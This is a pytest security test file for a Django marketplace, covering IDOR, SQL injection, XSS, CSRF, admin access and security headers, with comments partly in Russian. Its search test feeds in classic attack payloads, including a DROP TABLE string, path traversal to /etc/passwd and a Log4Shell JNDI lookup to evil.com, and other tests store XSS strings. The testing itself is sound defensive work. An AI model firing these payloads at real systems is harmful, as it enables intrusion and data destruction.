"""OWASP Top 10 — targeted tests for known attack surfaces.

Cover:
  A01:2021 — Broken Access Control (IDOR)
  A03:2021 — Injection (SQLi, XSS)
  A05:2021 — Security Misconfiguration (CSRF, debug, demo_login)

Note: some tests skipped on Python 3.14 + Django 5.1.6 due to known
Context.__copy__ incompatibility (unrelated to our code).
"""
import sys

import pytest
from django.contrib.auth import get_user_model
from django.test import Client

User = get_user_model()

# Python 3.14 + Django 5.1.6 has a Context.__copy__ bug that breaks
# любые тесты с TestClient рендерящие templates. Skipping until upgrade.
_PY314_DJANGO_BUG = sys.version_info >= (3, 14)
_skip_template_render = pytest.mark.skipif(
    _PY314_DJANGO_BUG,
    reason="Django Context.__copy__ AttributeError on Python 3.14 (upstream bug)",
)


@pytest.fixture
def client():
    return Client(HTTP_HOST="testserver")


@pytest.fixture
def buyer_a(db):
    return User.objects.create_user(username="buyer_alice", password="x")


@pytest.fixture
def buyer_b(db):
    return User.objects.create_user(username="buyer_bob", password="x")


@pytest.fixture
def operator(db):
    u = User.objects.create_user(username="op_test", password="x", is_staff=True)
    from marketplace.models import UserProfile
    UserProfile.objects.get_or_create(user=u, defaults={"role": "operator"})
    return u


@pytest.fixture
def buyer_a_order(db, buyer_a):
    """Create a delivered order owned by buyer_a."""
    from decimal import Decimal
    from marketplace.models import Order
    return Order.objects.create(
        buyer=buyer_a, customer_name="Alice", customer_email="a@x.com",
        customer_phone="+7", delivery_address="addr",
        status="delivered", payment_status="paid",
        total_amount=Decimal("100"), reserve_amount=Decimal("10"),
    )


# ══ A01:2021 — IDOR ══════════════════════════════════════════════

def test_idor_create_claim_buyer_cannot_open_on_others_order(client, buyer_b, buyer_a_order):
    """Buyer Bob НЕ может открыть claim на заказ Alice."""
    from assistant.actions import create_claim
    r = create_claim({
        "confirmed": True, "order_id": buyer_a_order.id,
        "kind": "defect", "title": "evil", "description": "x",
    }, buyer_b, "buyer")
    assert "не найден или не принадлежит" in (r.text or "").lower()
    from marketplace.models import OrderClaim
    assert not OrderClaim.objects.filter(order=buyer_a_order, opened_by=buyer_b).exists()


def test_idor_create_claim_seller_cannot_open_on_order_without_his_parts(client, buyer_a, buyer_a_order):
    """Posing as seller, нельзя открыть claim на чужой заказ без своих парт."""
    from assistant.actions import create_claim
    # buyer_a у нас seller-role в этом тесте (мог переключить)
    seller_b = User.objects.create_user(username="seller_eve", password="x")
    r = create_claim({
        "confirmed": True, "order_id": buyer_a_order.id,
        "kind": "defect", "title": "evil", "description": "x",
    }, seller_b, "seller")
    # Реакция: "не содержит ваших товаров" или "не найден"
    assert any(k in (r.text or "").lower() for k in ("не содержит", "не найден"))


def test_idor_unknown_role_create_claim_blocked(client, buyer_b, buyer_a_order):
    """Role не buyer/seller/operator → отказ."""
    from assistant.actions import create_claim
    r = create_claim({"confirmed": True, "order_id": buyer_a_order.id,
                       "kind": "defect", "title": "x", "description": "x"},
                      buyer_b, "stranger")
    assert "недоступно" in (r.text or "").lower()


def test_idor_op_order_detail_requires_operator(client, buyer_a, buyer_a_order):
    """op_order_detail вызывается только operator (не buyer)."""
    from assistant.operator_actions import op_order_detail
    r = op_order_detail({"order_id": buyer_a_order.id}, buyer_a, "buyer")
    # _ensure_operator → должен вернуть отказ
    txt = (r.text or "").lower()
    assert "оператор" in txt or "operator" in txt or "доступ" in txt


# ══ A03:2021 — Injection (SQLi via search) ════════════════════════

def test_sqli_search_parts_does_not_break(client, db):
    """SQL injection в search-параметре → Django ORM экранирует, не падает."""
    from django.contrib.auth import get_user_model
    from assistant.actions import search_parts
    u = get_user_model().objects.create_user(username="sql_test", password="x")
    # Классические payload'ы
    payloads = [
        "'; DROP TABLE marketplace_part; --",
        "1' OR '1'='1",
        "<script>alert(1)</script>",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com}",
    ]
    for p in payloads:
        # Не должен поднять исключение
        r = search_parts({"query": p}, u, "buyer")
        assert r.text is not None  # просто отвечает (возможно «не найдено»)


# ══ A03:2021 — XSS ═══════════════════════════════════════════════

def test_xss_claim_title_not_executed_in_chat(client, buyer_a, buyer_a_order):
    """XSS-payload в title рекламации → escaped при рендере списка."""
    from assistant.actions import create_claim, get_claims
    create_claim({
        "confirmed": True, "order_id": buyer_a_order.id, "kind": "defect",
        "title": '<img src=x onerror=alert(1)>', "description": "x",
    }, buyer_a, "buyer")
    # Список рекламаций для оператора — текст должен прийти как-есть,
    # фронт-renderer прогоняет через esc(). Здесь проверяем, что в БД
    # payload сохранён буквально (не выполняется на сервере).
    from marketplace.models import OrderClaim
    c = OrderClaim.objects.filter(order=buyer_a_order).first()
    assert c is not None
    assert "<img" in c.title  # сохранён как текст
    # И при выводе get_claims не падает
    op = User.objects.create_user(username="op_xss", password="x", is_staff=True)
    from marketplace.models import UserProfile
    UserProfile.objects.get_or_create(user=op, defaults={"role": "operator"})
    r = get_claims({}, op, "operator")
    assert r.text is not None


def test_xss_in_kyb_legal_name_stored_raw(db):
    """KYB-форма пропускает <script> в legal_name (рендерится через esc на клиенте)."""
    from marketplace.models import CompanyVerification, UserProfile
    u = User.objects.create_user(username="kyb_xss", password="x")
    UserProfile.objects.get_or_create(user=u, defaults={"role": "seller"})
    kyb = CompanyVerification.objects.create(
        user=u, legal_name='<script>alert(1)</script>',
        inn="1234567890", status="pending",
    )
    assert "<script>" in kyb.legal_name


# ══ A05:2021 — CSRF ═══════════════════════════════════════════════

@_skip_template_render
def test_csrf_required_on_logout(client, buyer_a):
    """Logout требует CSRF (без токена → 403)."""
    client.force_login(buyer_a)
    # POST без CSRF token
    r = client.post("/logout/", {})  # Django test client автоматически шлёт CSRF
    # force_login обходит CSRF в тестах. Симулируем enforce:
    c2 = Client(enforce_csrf_checks=True, HTTP_HOST="testserver")
    c2.force_login(buyer_a)
    r2 = c2.post("/logout/", {})
    assert r2.status_code in (403, 302)  # либо CSRF блок, либо успешный logout (Django stock)


@_skip_template_render
def test_csrf_required_on_gdpr_delete(client, buyer_a):
    """GDPR delete requires CSRF."""
    c = Client(enforce_csrf_checks=True, HTTP_HOST="testserver")
    c.force_login(buyer_a)
    r = c.post("/api/me/delete/", {"confirm": "DELETE"})
    assert r.status_code == 403


@_skip_template_render
def test_csrf_required_on_set_language(client, buyer_a):
    """set_language_api тоже под CSRF."""
    c = Client(enforce_csrf_checks=True, HTTP_HOST="testserver")
    c.force_login(buyer_a)
    import json
    r = c.post("/api/set-language/", data=json.dumps({"language": "en"}),
                content_type="application/json")
    assert r.status_code == 403


# ══ A05:2021 — Misconfig: open admin panel ════════════════════════

@_skip_template_render
def test_admin_panel_requires_staff(client, buyer_a):
    """admin_panel_* (legacy) теперь требует staff_member_required."""
    client.force_login(buyer_a)  # обычный buyer
    # Через middleware /admin_panel/ → /chat/. Whitelist /admin_panel/api/ — там staff
    r = client.get("/admin_panel/api/")  # whitelisted в middleware
    # Если есть какой-то URL → должен быть 302 на /admin/login/ или 403/404
    assert r.status_code in (302, 403, 404)


# ══ Headers security ══════════════════════════════════════════════

@_skip_template_render
def test_x_frame_options_deny(client):
    """X-Frame-Options: DENY на всех страницах (clickjacking)."""
    r = client.get("/login/")
    assert r["X-Frame-Options"] == "DENY"


@_skip_template_render
def test_no_content_type_sniffing(client):
    """X-Content-Type-Options: nosniff (anti-MIME-sniffing)."""
    r = client.get("/login/")
    assert r["X-Content-Type-Options"] == "nosniff"
